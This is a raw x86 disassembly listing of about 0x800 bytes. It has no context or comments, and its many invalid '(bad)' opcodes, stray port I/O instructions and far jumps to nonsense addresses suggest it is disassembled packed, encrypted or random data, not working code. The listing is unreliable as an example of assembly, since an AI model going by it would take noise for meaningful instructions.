  4181b3:	jecxz  0x4181de
  4181b5:	xchg   BYTE PTR [ebx+0x65],dl
  4181b8:	sbb    al,0x44
  4181ba:	or     eax,0x8c4ec4ea
  4181bf:	xchg   edx,eax
  4181c0:	mov    ah,0x6b
  4181c2:	data16 sahf 
  4181c4:	inc    ebx
  4181c5:	xor    ebp,esp
  4181c7:	xchg   ebx,eax
  4181c8:	ins    BYTE PTR es:[edi],dx
  4181c9:	xchg   ebx,eax
  4181ca:	adc    BYTE PTR [edx-0x1b],cl
  4181cd:	jge    0x418156
  4181cf:	push   es
  4181d0:	xchg   ebp,eax
  4181d1:	addr16 sub edx,ecx
  4181d4:	popf   
  4181d5:	lea    ebp,ds:0x482a415b
  4181db:	ins    DWORD PTR es:[edi],dx
  4181dc:	pop    esi
  4181dd:	sahf   
  4181de:	jae    0x418217
  4181e0:	outs   dx,BYTE PTR ds:[esi]
  4181e1:	sub    ebp,esi
  4181e3:	pushf  
  4181e4:	adc    BYTE PTR [edx],dl
  4181e6:	and    al,0x20
  4181e8:	dec    eax
  4181e9:	jecxz  0x418237
  4181eb:	icebp  
  4181ec:	pop    ebp
  4181ed:	jle    0x41821f
  4181ef:	jmp    0x9db4:0x22f68931
  4181f6:	loope  0x418198
  4181f8:	xlat   BYTE PTR ds:[ebx]
  4181f9:	pop    edi
  4181fa:	adc    eax,0xa2f57d25
  4181ff:	pop    ecx
  418200:	ficomp WORD PTR [ecx-0xae474fc]
  418206:	popf   
  418207:	pop    ecx
  418208:	mov    ecx,0x98a4e257
  41820d:	cmp    ah,dh
  41820f:	icebp  
  418210:	inc    ecx
  418211:	outs   dx,BYTE PTR ds:[esi]
  418212:	mov    BYTE PTR [ebp-0x48048add],al
  418218:	(bad)  
  418219:	mov    ds:0xea19bb3d,eax
  41821e:	bound  ebp,QWORD PTR [edi-0xe]
  418221:	mov    dh,0xf9
  418223:	xor    al,0x30
  418225:	xchg   dl,dl
  418227:	aad    0x90
  418229:	cmp    esp,esp
  41822b:	sub    eax,0xecd51b44
  418230:	aas    
  418231:	push   0x36
  418233:	and    al,dl
  418235:	out    0xc6,al
  418237:	dec    ebp
  418238:	icebp  
  418239:	inc    edi
  41823a:	pop    es
  41823b:	cmp    ah,BYTE PTR [edx+0x3]
  41823e:	inc    ecx
  41823f:	cmp    bh,BYTE PTR [edx]
  418241:	lock imul eax,DWORD PTR [edi+0x23f10351],0xbb8c9669
  41824c:	xchg   edi,eax
  41824d:	shr    DWORD PTR [edx-0x1],0x4b
  418251:	sub    eax,DWORD PTR [eax]
  418253:	lods   al,BYTE PTR ds:[esi]
  418254:	out    dx,al
  418255:	aaa    
  418256:	outs   dx,BYTE PTR ds:[esi]
  418257:	pop    esi
  418258:	mov    esi,0xf05310db
  41825d:	loope  0x4182b8
  41825f:	es mov dl,0x0
  418262:	retf   
  418263:	pusha  
  418264:	mov    esp,0xe60e6060
  418269:	mov    al,ds:0x409cc6bf
  41826e:	clc    
  41826f:	retf   0xd2e
  418272:	loope  0x4182ae
  418274:	(bad)  
  418275:	cmp    al,BYTE PTR [esi+0x48]
  418278:	arpl   WORD PTR [ebx+0x4cd4f1a3],di
  41827e:	ror    BYTE PTR [ebx+0x7b710c95],0xd4
  418285:	cmp    ebp,esi
  418287:	fdivr  QWORD PTR [esi+0x24]
  41828a:	adc    bh,dl
  41828c:	inc    edi
  41828d:	das    
  41828e:	out    0xec,al
  418290:	mov    dl,0x76
  418292:	xor    edx,DWORD PTR [ebx+0x5b]
  418295:	repz push 0xffffffe6
  418298:	scas   al,BYTE PTR es:[edi]
  418299:	xchg   DWORD PTR [esi-0x28d4e698],edx
  41829f:	sbb    eax,0x2e8b1d5e
  4182a4:	sti    
  4182a5:	aad    0x22
  4182a7:	cmc    
  4182a8:	sbb    BYTE PTR [eax+esi*8-0x7f],cl
  4182ac:	daa    
  4182ad:	scas   eax,DWORD PTR es:[edi]
  4182ae:	jo     0x418248
  4182b0:	dec    esi
  4182b1:	les    edx,FWORD PTR [edx-0x7d3d6b2f]
  4182b7:	(bad)  
  4182b8:	fidiv  DWORD PTR [edi-0x66]
  4182bb:	(bad)  
  4182bd:	fild   WORD PTR [ecx+0x145301d9]
  4182c3:	push   ebp
  4182c4:	dec    ecx
  4182c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182c6:	(bad)  
  4182c7:	into   
  4182c8:	sbb    al,0x5e
  4182ca:	pop    edx
  4182cb:	sbb    eax,0xb070fd4f
  4182d0:	adc    al,0x56
  4182d2:	xchg   esi,eax
  4182d3:	das    
  4182d4:	out    dx,eax
  4182d5:	(bad)  
  4182d6:	leave  
  4182d7:	jbe    0x4182ee
  4182d9:	les    eax,FWORD PTR [ecx+0x30]
  4182dc:	xor    eax,0x1c523d4e
  4182e1:	cdq    
  4182e2:	stos   BYTE PTR es:[edi],al
  4182e3:	scas   al,BYTE PTR es:[edi]
  4182e4:	xchg   BYTE PTR ds:0x539c403e,dl
  4182ea:	cli    
  4182eb:	cs out 0xb5,al
  4182ee:	iret   
  4182ef:	ins    DWORD PTR es:[edi],dx
  4182f0:	inc    ebp
  4182f1:	pop    ecx
  4182f2:	and    DWORD PTR [edx+0x2bb4bd7a],ecx
  4182f8:	push   ds
  4182f9:	ds dec esi
  4182fb:	jmp    0x45511edd
  418300:	pop    ds
  418301:	mov    bl,0x8e
  418303:	and    eax,0x8836dc9f
  418308:	mov    esp,0xf26dce85
  41830d:	ins    BYTE PTR es:[edi],dx
  41830e:	aas    
  41830f:	lahf   
  418310:	adc    bl,bl
  418312:	repz int 0x51
  418315:	mov    eax,0x4feb1601
  41831a:	lahf   
  41831b:	sbb    al,0x2d
  41831d:	add    eax,0x55b02c11
  418323:	(bad)  
  418324:	ret    0x7b64
  418327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418328:	mov    eax,ds:0x4059fd93
  41832d:	retf   0xa1eb
  418330:	int3   
  418331:	test   eax,0x7639b415
  418336:	jmp    0xeeb8:0x6bfa0b35
  41833d:	xchg   edx,eax
  41833e:	cmc    
  41833f:	mov    edi,ss
  418341:	adc    al,0x7c
  418343:	jg     0x4183aa
  418345:	jl     0x418387
  418347:	pop    edx
  418348:	and    ch,al
  41834a:	in     eax,dx
  41834b:	xchg   ebp,eax
  41834c:	sbb    eax,0x4142f8f8
  418351:	dec    eax
  418352:	mov    ebx,0x9b047870
  418357:	mov    edi,0x49fc894e
  41835c:	push   0x33
  41835e:	inc    ebp
  41835f:	mov    cl,0x15
  418361:	cmp    DWORD PTR [esi+0x2a9050ed],esi
  418367:	ret    
  418368:	mov    esp,0x17e0afb4
  41836d:	out    dx,al
  41836e:	je     0x41834c
  418370:	data16 jno 0x418310
  418373:	push   cs
  418374:	jecxz  0x418349
  418376:	out    dx,eax
  418377:	cmc    
  418378:	add    eax,0x74227a15
  41837d:	mov    ebx,0x4ca895f7
  418382:	adc    bh,BYTE PTR [esp+ebx*1-0x14]
  418386:	or     BYTE PTR [eax],ah
  418388:	(bad)  [ebp-0x22]
  41838b:	cmc    
  41838c:	xor    bl,BYTE PTR [edi+0x65]
  41838f:	mov    esi,0xcaa099c8
  418394:	adc    al,0x5d
  418396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418397:	add    al,0x4b
  418399:	popa   
  41839a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41839b:	sub    WORD PTR [edi],cx
  41839e:	xchg   esi,eax
  41839f:	mov    ds:0xbb414c67,eax
  4183a4:	inc    edx
  4183a5:	jae    0x418415
  4183a7:	cli    
  4183a8:	xbegin 0x25cc6a11
  4183ae:	mov    bl,0x7e
  4183b0:	cld    
  4183b1:	imul   ebp,DWORD PTR [eax+0x6921f0d7],0x90649a77
  4183bb:	xor    eax,0x3c3af8f6
  4183c0:	jno    0x4183ad
  4183c2:	xchg   edi,ecx
  4183c4:	fs push cs
  4183c6:	jmp    0x418368
  4183c8:	mov    ebp,0xfcde2e6e
  4183cd:	dec    ebp
  4183ce:	std    
  4183cf:	sahf   
  4183d0:	inc    esi
  4183d1:	cli    
  4183d2:	cmp    al,0x74
  4183d4:	imul   eax,DWORD PTR [ebx],0xddb7ce98
  4183da:	sbb    eax,0x7c535927
  4183df:	and    ecx,0xb5484b0c
  4183e5:	in     eax,0x3a
  4183e7:	rol    DWORD PTR [ecx-0x37],0x4e
  4183eb:	ret    0xd92e
  4183ee:	sub    ebx,0xffffffae
  4183f1:	(bad)  
  4183f2:	push   ecx
  4183f3:	sub    ecx,DWORD PTR [eax-0x3f]
  4183f6:	adc    al,0xf6
  4183f8:	sbb    ebp,eax
  4183fa:	mov    al,fs:0xc4fe7b2d
  418400:	test   DWORD PTR [esp+eax*1],0xcc73f810
  418407:	cmp    DWORD PTR ds:0x843405d0,ecx
  41840d:	test   al,0x4
  41840f:	cdq    
  418410:	std    
  418411:	(bad)  
  418412:	mov    bh,0x6
  418414:	mov    ebx,0xb93f88ca
  418419:	gs sbb eax,0xb91f648d
  41841f:	mov    gs,WORD PTR ds:0xdc5dd922
  418425:	ja     0x41841a
  418427:	cli    
  418428:	inc    ecx
  418429:	push   edi
  41842a:	jmp    0x9bf835e3
  41842f:	push   edx
  418430:	or     eax,0xe91209f6
  418435:	push   ebx
  418436:	call   0xaa05:0x8c868ff8
  41843d:	stos   DWORD PTR es:[edi],eax
  41843e:	ror    DWORD PTR [eax],cl
  418440:	into   
  418441:	inc    ebp
  418442:	fldcw  WORD PTR [edi]
  418444:	pop    eax
  418445:	inc    ebp
  418446:	xchg   esp,eax
  418447:	mov    edi,0x9d40550
  41844c:	jno    0x41847b
  41844e:	sbb    eax,0x6c5d6a4f
  418453:	gs scas al,BYTE PTR es:[edi]
  418455:	push   ds
  418456:	mov    ebp,0x4deccd0d
  41845b:	mov    ebx,0xab56f426
  418460:	mov    al,al
  418462:	loope  0x418421
  418464:	icebp  
  418465:	loop   0x4184e5
  418467:	sbb    ebx,DWORD PTR [esi-0x58795c75]
  41846d:	sub    cl,ch
  41846f:	hlt    
  418470:	ret    0x57f5
  418473:	cld    
  418474:	cdq    
  418475:	cmp    al,BYTE PTR [esi]
  418477:	xor    esp,ecx
  418479:	pop    eax
  41847a:	fimul  DWORD PTR [edx+0x60]
  41847d:	std    
  41847e:	clc    
  41847f:	mov    ch,0x15
  418481:	cmp    cl,BYTE PTR [esi-0x32]
  418484:	ds push es
  418486:	std    
  418487:	sbb    DWORD PTR [ebx-0x35ba78f9],edx
  41848d:	in     eax,dx
  41848e:	test   eax,0xe30c76c8
  418493:	ds and eax,0xa0b1e0d0
  418499:	out    dx,al
  41849a:	inc    ecx
  41849b:	test   eax,0x7dfaf8d6
  4184a0:	data16 clc 
  4184a2:	inc    ebx
  4184a3:	int    0x69
  4184a5:	dec    ebx
  4184a6:	test   bl,ah
  4184a8:	sbb    BYTE PTR [edi-0x7930af09],bl
  4184ae:	pop    ebp
  4184af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b0:	arpl   WORD PTR [ecx*4-0x26c3ddbc],dx
  4184b7:	cli    
  4184b8:	mov    dl,BYTE PTR [edi+0x50]
  4184bb:	pop    ecx
  4184bc:	ins    BYTE PTR es:[edi],dx
  4184bd:	pop    ss
  4184be:	pusha  
  4184bf:	shr    BYTE PTR [eax],0x4f
  4184c2:	add    dl,BYTE PTR [edx]
  4184c4:	stc    
  4184c5:	pop    edi
  4184c6:	dec    edx
  4184c7:	adc    ch,BYTE PTR [ebx-0x296ad924]
  4184cd:	rol    ebp,0x12
  4184d0:	or     ebp,DWORD PTR ds:0x89034ac8
  4184d6:	xor    DWORD PTR [ecx],ecx
  4184d8:	cmp    eax,0xea9f283e
  4184dd:	or     cl,BYTE PTR [ebp+0x3d]
  4184e0:	aaa    
  4184e1:	mov    gs,edx
  4184e3:	inc    esi
  4184e4:	loope  0x41847a
  4184e6:	mov    WORD PTR [ecx],gs
  4184e8:	xchg   edx,eax
  4184e9:	pop    ebx
  4184ea:	rcl    BYTE PTR [edi-0x27],cl
  4184ed:	lds    eax,FWORD PTR [edi+0x58]
  4184f0:	mov    edx,DWORD PTR gs:[eax+edi*8+0x41]
  4184f5:	dec    ecx
  4184f6:	push   ebp
  4184f7:	popa   
  4184f8:	dec    ebx
  4184f9:	sbb    eax,0x1a8e370
  4184fe:	mov    DWORD PTR [edi+0x522660bd],0x5a41d469
  418508:	add    esp,DWORD PTR ds:0x3c64a962
  41850e:	call   0xe82e:0xa4616cfa
  418515:	lds    ebx,FWORD PTR [ecx-0x650b7e37]
  41851b:	mov    ds:0xaa85096a,al
  418520:	mov    al,ds:0xdb9ebf96
  418525:	cmp    al,0xe6
  418527:	ds (bad) 
  41852a:	add    bl,BYTE PTR [eax]
  41852c:	push   cs
  41852d:	stc    
  41852e:	int    0x76
  418530:	pop    esp
  418531:	push   ss
  418532:	lds    ebp,FWORD PTR [eax-0x52d1de84]
  418538:	scas   eax,DWORD PTR es:[edi]
  418539:	or     eax,0x8a958689
  41853e:	sbb    al,0x4e
  418540:	popa   
  418541:	lock sti 
  418543:	mov    edi,0xa66c4b47
  418548:	add    ah,cl
  41854a:	lahf   
  41854b:	mov    eax,0x1f624187
  418550:	adc    esp,DWORD PTR [edx+0x570724c8]
  418556:	icebp  
  418557:	pop    ecx
  418558:	inc    esi
  418559:	xor    edx,ecx
  41855b:	ret    
  41855c:	jno    0x4185c7
  41855e:	(bad)  
  41855f:	push   esp
  418560:	adc    ebx,ecx
  418562:	pop    ebx
  418563:	test   eax,0x486c66ac
  418568:	std    
  418569:	cmc    
  41856a:	ret    0x690d
  41856d:	push   esi
  41856e:	fadd   DWORD PTR [eax]
  418570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418571:	cld    
  418572:	push   eax
  418573:	vpmulhw xmm7,xmm5,XMMWORD PTR [edi-0x17c97cae]
  41857b:	jmp    0x4f6a:0xc62feb1
  418582:	mov    edi,0x6e90dda8
  418587:	cmp    BYTE PTR [edi+esi*8-0xd],dh
  41858b:	(bad)  
  41858c:	out    dx,eax
  41858d:	test   dl,dh
  41858f:	retf   0x8d2d
  418592:	ss mov edi,0x95c360b0
  418598:	fdiv   QWORD PTR [edx+0x3771694b]
  41859e:	xor    cl,BYTE PTR [edi+0x7521c5d4]
  4185a4:	out    dx,al
  4185a5:	adc    al,0x47
  4185a7:	push   esi
  4185a8:	sbb    bh,al
  4185aa:	mov    edi,0x5bfa7bf7
  4185af:	ins    DWORD PTR es:[edi],dx
  4185b0:	pusha  
  4185b1:	and    cl,BYTE PTR [esi-0x43ad9321]
  4185b7:	push   ebx
  4185b8:	add    BYTE PTR [ecx],dl
  4185ba:	retf   
  4185bb:	jb     0x4185b4
  4185bd:	adc    eax,0x469984e8
  4185c2:	jno    0x418560
  4185c4:	lahf   
  4185c5:	mov    al,ch
  4185c7:	out    0x62,al
  4185c9:	pop    edi
  4185ca:	neg    BYTE PTR [ebx]
  4185cc:	cmp    BYTE PTR [edx],ah
  4185ce:	mov    ah,0x87
  4185d0:	sub    dl,bh
  4185d2:	(bad)  
  4185d3:	or     eax,0x85fe26c9
  4185d8:	aas    
  4185d9:	inc    esi
  4185da:	imul   edx,ebx,0x91e5c7dc
  4185e0:	adc    ebx,DWORD PTR [esi-0x4]
  4185e3:	test   DWORD PTR [ebx+0x67],ebp
  4185e6:	dec    esi
  4185e7:	std    
  4185e8:	push   ds
  4185e9:	not    ebx
  4185eb:	mov    cl,0x80
  4185ed:	pop    es
  4185ee:	xor    ah,BYTE PTR [ebx+ebx*8+0xc]
  4185f2:	(bad)  
  4185f3:	dec    ebp
  4185f4:	popf   
  4185f5:	pop    edx
  4185f6:	jb     0x4185e7
  4185f8:	sub    eax,0x645260e
  4185fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185fe:	pop    ebx
  4185ff:	stc    
  418600:	and    BYTE PTR [ebx],dh
  418602:	and    esi,ecx
  418604:	jbe    0x4185e8
  418606:	push   ebx
  418607:	pop    ds
  418608:	mov    ebp,0x891f338e
  41860d:	push   edi
  41860e:	add    ecx,DWORD PTR [edx]
  418610:	aaa    
  418611:	dec    esi
  418612:	mov    edi,0xb992634
  418617:	sub    esp,eax
  418619:	jmp    0x53b6df68
  41861e:	out    dx,eax
  41861f:	out    0x38,eax
  418621:	pop    ds
  418622:	jl     0x418601
  418624:	mov    ch,0x3d
  418626:	sub    eax,0x96a1cf8b
  41862b:	jbe    0x4185fd
  41862d:	inc    eax
  41862e:	shr    BYTE PTR [ebx-0x5f53f96a],cl
  418634:	jp     0x4185f8
  418636:	pop    ebp
  418637:	test   esp,ecx
  418639:	mov    bl,0xbf
  41863b:	cmp    BYTE PTR [ecx+0x426df0dd],al
  418641:	popa   
  418642:	or     bh,bh
  418644:	je     0x4185f3
  418646:	enter  0xa255,0x27
  41864a:	rcr    DWORD PTR [ecx+0x58],0x31
  41864e:	ror    BYTE PTR [eax+0x761a6c15],0x9
  418655:	ins    DWORD PTR es:[edi],dx
  418656:	aaa    
  418657:	push   esp
  418658:	stc    
  418659:	arpl   WORD PTR [ebp-0x5d],si
  41865c:	clc    
  41865d:	mov    ds:0xa08a6ba7,al
  418662:	xchg   dh,dh
  418664:	add    al,0xe9
  418666:	cmp    BYTE PTR [eax-0x2f],0xd8
  41866a:	test   BYTE PTR [esp+eiz*4],0x1
  41866e:	add    esp,DWORD PTR [ebp+0x48]
  418671:	mov    ebx,0x8f615c59
  418676:	jmp    0x5c26:0x950a9206
  41867d:	fwait
  41867e:	imul   eax,DWORD PTR [esi-0x2a],0x343fd74f
  418685:	in     eax,0x4a
  418687:	pop    ss
  418688:	push   es
  418689:	(bad)  
  41868a:	push   ebp
  41868b:	bnd jge 0x418697
  41868e:	cmp    DWORD PTR [ecx+ebx*4+0x13],esp
  418692:	lahf   
  418693:	js     0x418671
  418695:	mov    al,ds:0x649da8c5
  41869a:	shl    ebp,0x9d
  41869d:	jno    0x418695
  41869f:	mov    ds:0x5044ee6b,al
  4186a4:	sbb    ch,dh
  4186a6:	loop   0x418703
  4186a8:	xor    al,0x7d
  4186aa:	(bad)  
  4186ab:	jb     0x4186b1
  4186ad:	or     ah,BYTE PTR [esi-0x14]
  4186b0:	jno    0x41866a
  4186b2:	stc    
  4186b3:	pusha  
  4186b4:	xorps  xmm7,XMMWORD PTR [edx-0x32ad4a48]
  4186bb:	aas    
  4186bc:	mov    cs,edx
  4186be:	jp     0x418695
  4186c0:	push   esp
  4186c1:	sbb    eax,0x42ae6c36
  4186c6:	imul   edi,DWORD PTR [ebx+0x4c9b11da],0xacc67f4e
  4186d0:	retf   
  4186d1:	jecxz  0x418741
  4186d3:	gs rcl cl,0x90
  4186d7:	xor    al,ah
  4186d9:	xor    edx,DWORD PTR [edi]
  4186db:	xor    al,BYTE PTR [edi+ecx*4-0x1d]
  4186df:	hlt    
  4186e0:	xchg   ecx,eax
  4186e1:	lds    edi,FWORD PTR [edi]
  4186e3:	mov    WORD PTR [edx-0x16d56fb8],ds
  4186e9:	and    DWORD PTR ds:0xf784fe57,0xffffffba
  4186f0:	sahf   
  4186f1:	add    esp,esp
  4186f3:	push   eax
  4186f4:	fmulp  st(1),st
  4186f6:	sbb    ah,ah
  4186f8:	in     eax,dx
  4186f9:	hlt    
  4186fa:	xadd   DWORD PTR [eax-0x63],ebx
  4186fe:	push   0x46
  418700:	cmp    eax,0xcd1de61f
  418705:	cld    
  418706:	fmul   st,st(1)
  418708:	push   ecx
  418709:	out    0xaa,eax
  41870b:	idiv   BYTE PTR [esp+ebp*1+0x39809497]
  418712:	(bad)  
  418713:	and    al,0x53
  418715:	dec    esp
  418716:	in     eax,0x64
  418718:	adc    ebx,ebp
  41871a:	or     eax,0x9726b0f0
  41871f:	jle    0x418702
  418721:	add    al,0x8e
  418723:	icebp  
  418724:	inc    edx
  418725:	mov    ebp,0x1c067bc5
  41872a:	jmp    0xe4e:0x38dfc407
  418731:	out    dx,eax
  418732:	cmp    BYTE PTR [edx+0x54e9f131],dl
  418738:	not    ch
  41873a:	jb     0x418715
  41873c:	push   0xa770294
  418741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418742:	sub    BYTE PTR [edi],ch
  418744:	xchg   ecx,eax
  418745:	out    dx,al
  418746:	test   DWORD PTR [eax],edi
  418748:	fsubr  DWORD PTR [ebp-0x442a78c8]
  41874e:	js     0x418747
  418750:	fisub  WORD PTR [ebx-0x75]
  418753:	mov    ecx,0xaedbc847
  418758:	(bad)  
  41875a:	adc    dl,BYTE PTR ds:0xe7775c52
  418760:	cmp    BYTE PTR [edi],ch
  418762:	fisttp DWORD PTR [ebx]
  418764:	xchg   ecx,eax
  418765:	push   ebp
  418766:	push   ds
  418767:	cmp    BYTE PTR [ebp+0x48],ch
  41876a:	icebp  
  41876b:	dec    esi
  41876c:	nop
  41876d:	je     0x41874a
  41876f:	dec    esi
  418770:	or     bl,BYTE PTR [ecx+0x4c]
  418773:	or     al,0x10
  418775:	inc    eax
  418776:	push   ebp
  418777:	jp     0x418709
  418779:	fs pop es
  41877b:	jne    0x41871c
  41877d:	ficomp DWORD PTR [ebx-0x64]
  418780:	xchg   esi,eax
  418781:	leave  
  418782:	mov    ds:0xb6c6cdd6,eax
  418787:	sahf   
  418788:	sub    cl,BYTE PTR [esi-0x6a]
  41878b:	ret    0x8dde
  41878e:	mov    eax,ds:0xf5bce7fc
  418793:	mov    edi,0x15d94b70
  418798:	xchg   ecx,eax
  418799:	jecxz  0x41872f
  41879b:	or     edi,ebp
  41879d:	popa   
  41879e:	xchg   esp,eax
  41879f:	pushf  
  4187a0:	lea    ecx,[ebp-0x45]
  4187a3:	pop    ebp
  4187a4:	repnz dec ecx
  4187a6:	fadd   QWORD PTR [ecx]
  4187a8:	addr16 out 0xc9,eax
  4187ab:	sbb    DWORD PTR ds:0xb3370983,ebp
  4187b1:	imul   ecx,DWORD PTR [ebx-0x58],0x62cb1f3
  4187b8:	imul   esp,DWORD PTR ds:0x2ff49af9,0xef9c863f
  4187c2:	in     al,0x45
  4187c4:	push   ds
  4187c5:	cld    
  4187c6:	fs iret 
  4187c8:	sbb    edi,ecx
  4187ca:	cmp    ecx,eax
  4187cc:	jg     0x418832
  4187ce:	in     eax,dx
  4187cf:	js     0x418831
  4187d1:	sub    BYTE PTR [eiz*8-0x3eaa0d5d],cl
  4187d8:	jmp    0x418768
  4187da:	adc    al,0x47
  4187dc:	pop    ebx
  4187dd:	lds    edi,FWORD PTR [edx+ecx*4-0xa]
  4187e1:	cwde   
  4187e2:	push   esi
  4187e3:	jo     0x418797
  4187e5:	dec    ebx
  4187e6:	jecxz  0x418835
  4187e8:	arpl   WORD PTR [eax],cx
  4187ea:	std    
  4187eb:	mov    edx,0x175e530a
  4187f0:	mov    esp,0x27405ec1
  4187f5:	jp     0x418827
  4187f7:	add    DWORD PTR ds:0x30934c98,esi
  4187fd:	(bad)
  418802:	pop    eax
  418803:	out    dx,al
  418804:	push   ecx
  418805:	outs   dx,BYTE PTR ds:[esi]
  418806:	xchg   ecx,eax
  418807:	int    0x95
  418809:	cld    
  41880a:	pop    es
  41880b:	lods   al,BYTE PTR ds:[esi]
  41880c:	mov    ds:0x3999a1a1,eax
  418811:	lock or BYTE PTR [ebx],cl
  418814:	rcr    DWORD PTR [ebx-0x1fb6f04],0x3d
  41881b:	pop    ebp
  41881c:	imul   esp,esi,0x32
  41881f:	ror    BYTE PTR fs:[eax+0x71ba596f],cl
  418826:	xor    al,0x4a
  418828:	imul   BYTE PTR [ecx+0x1f]
  41882b:	in     eax,0x1f
  41882d:	jo     0x4187ee
  41882f:	or     DWORD PTR [eax+0x7d],ebp
  418832:	or     DWORD PTR [ebx+0x31],edx
  418835:	cmc    
  418836:	jl     0x4187b8
  418838:	es popa 
  41883a:	push   ds
  41883b:	xor    DWORD PTR [ecx+0x53],0xb6c1892
  418842:	push   ebp
  418843:	ins    BYTE PTR es:[edi],dx
  418844:	mov    dh,BYTE PTR [ebx]
  418846:	xor    eax,0xe4694555
  41884b:	xchg   esp,eax
  41884c:	fdivr  DWORD PTR [edx+0x3b]
  41884f:	cmp    eax,0x80fe2e66
  418854:	xchg   esp,eax
  418855:	inc    esp
  418856:	add    ah,bl
  418858:	push   esp
  418859:	add    DWORD PTR [edi+0x1f19d207],eax
  41885f:	push   0x64
  418861:	adc    BYTE PTR [ebx-0x65],dh
  418864:	dec    ebp
  418865:	out    dx,al
  418866:	jne    0x418886
  418868:	inc    edi
  418869:	or     al,0xae
  41886b:	scas   al,BYTE PTR es:[edi]
  41886c:	inc    edx
  41886d:	out    0x22,al
  41886f:	adc    bl,BYTE PTR [ebp-0x610090f0]
  418875:	les    ecx,FWORD PTR [ebp+0x9493c60]
  41887b:	neg    BYTE PTR [eax+0x40]
  41887e:	xor    eax,0x7e7348d
  418883:	fbld   TBYTE PTR [ecx-0x6]
  418886:	push   esp
  418887:	fdiv   st(1),st
  418889:	nop
  41888a:	stos   BYTE PTR es:[edi],al
  41888b:	(bad)  
  41888c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41888d:	xor    al,0xe4
  41888f:	js     0x418905
  418891:	sub    DWORD PTR [esp+edi*1+0x4e],eax
  418895:	cmp    ah,BYTE PTR ds:0x289dbaad
  41889b:	call   0x409:0xb2c8fc26
  4188a2:	sub    DWORD PTR [ebp+0x4c],edx
  4188a5:	les    ecx,FWORD PTR [eax]
  4188a7:	inc    ebx
  4188a8:	cwde   
  4188a9:	fnstsw WORD PTR [eax-0x16b34f0d]
  4188af:	mov    ebx,0xb72f47a8
  4188b4:	mov    eax,0x800a6a49
  4188b9:	jbe    0x418847
  4188bb:	adc    al,BYTE PTR [esi+0x377c72e6]
  4188c1:	jg     0x418879
  4188c3:	pop    ss
  4188c4:	cmp    bh,0x8d
  4188c7:	add    ebx,DWORD PTR [ebx-0x69b10169]
  4188cd:	pop    ebp
  4188ce:	ret    
  4188cf:	cmp    al,0x91
  4188d1:	test   DWORD PTR [ecx-0x1e8e5c8d],0xc17aa533
  4188db:	mov    cl,0x98
  4188dd:	push   esp
  4188de:	ret    
  4188df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e0:	dec    esp
  4188e1:	mov    dl,BYTE PTR ds:0x84c3aba8
  4188e7:	add    BYTE PTR [edx],ch
  4188e9:	das    
  4188ea:	test   DWORD PTR [edx+0x9],ecx
  4188ed:	cmp    ebx,esi
  4188ef:	outs   dx,BYTE PTR ds:[esi]
  4188f0:	pop    ebx
  4188f1:	rol    DWORD PTR [ebx-0x2bb4d7ee],cl
  4188f7:	sbb    BYTE PTR [ebp-0x7],cl
  4188fa:	cmc    
  4188fb:	push   ebx
  4188fc:	inc    edi
  4188fd:	int    0x71
  4188ff:	aad    0x86
  418901:	jno    0x418925
  418903:	lahf   
  418904:	mov    bh,0x9a
  418906:	gs frndint 
  418909:	fdivrp st(2),st
  41890b:	mov    edi,0xef246004
  418910:	push   ebp
  418911:	push   esi
  418912:	sbb    al,0x10
  418914:	bound  esi,QWORD PTR [edi-0x465d566c]
  41891a:	mov    dh,0xce
  41891c:	dec    esi
  41891d:	push   ebx
  41891e:	repnz mov bh,0xeb
  418921:	(bad)  
  418923:	pop    ecx
  418924:	iret   
  418925:	and    ebp,DWORD PTR [ebx]
  418927:	ja     0x418937
  418929:	test   eax,esi
  41892b:	retf   
  41892c:	mov    al,0xc6
  41892e:	out    0xf4,eax
  418930:	sbb    eax,0x53f1cdbe
  418935:	lds    esp,FWORD PTR [ecx+0x67]
  418938:	push   eax
  418939:	neg    dl
  41893b:	stos   BYTE PTR es:[edi],al
  41893c:	and    al,0xe5
  41893e:	(bad)  
  41893f:	scas   eax,DWORD PTR es:[edi]
  418940:	push   ecx
  418941:	add    eax,0xc11c5458
  418946:	and    bl,BYTE PTR [ecx]
  418948:	pop    edi
  418949:	retf   0x9c2e
  41894c:	out    dx,eax
  41894d:	jno    0x418965
  41894f:	je     0x418934
  418951:	sbb    eax,0xdde2eab9
  418956:	xor    BYTE PTR [edi+0x7f0dd117],cl
  41895c:	add    eax,0xf9f8b447
  418961:	fdivrp st(3),st
  418963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418964:	aas    
  418965:	mov    cl,0xd9
  418967:	dec    eax
  418968:	push   ecx
  418969:	push   esp
  41896a:	mov    ?,WORD PTR [ecx]
  41896c:	push   ds
  41896d:	int    0x69
  41896f:	shr    BYTE PTR [eax-0x1a480f5d],0xfb
  418976:	lds    edi,FWORD PTR [esi+0x492f1da9]
  41897c:	jb     0x418905
  41897e:	or     al,0x63
  418980:	mov    dh,0xdb
  418982:	add    BYTE PTR [edi+0x2bc287bf],cl
  418988:	aad    0x84
  41898a:	test   dh,bh
  41898c:	loopne 0x41896a
  41898e:	(bad)  
  41898f:	mov    dh,0x8d
  418991:	cmp    DWORD PTR [ebp-0x2aecccd6],eax
  418997:	imul   ecx,DWORD PTR [ebx+0x348397ce],0xffffff89
  41899e:	mov    dl,al
  4189a0:	rcl    BYTE PTR [edi-0x52ed96df],0x44
  4189a7:	push   edi
  4189a8:	(bad)  
  4189a9:	mov    ch,0xbd
  4189ab:	jg     0x418a23
  4189ad:	das    
  4189ae:	ret    
  4189af:	dec    esi
  4189b0:	nop
  4189b1:	data16 in al,dx
  4189b3:	stos   DWORD PTR es:[edi],eax
  4189b4:	mov    bl,0x6a
  4189b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189b8:	leave  
  4189b9:	pop    edi
  4189ba:	addr16 neg bh
  4189bd:	inc    edx
  4189be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bf:	adc    eax,0xd4c21f08
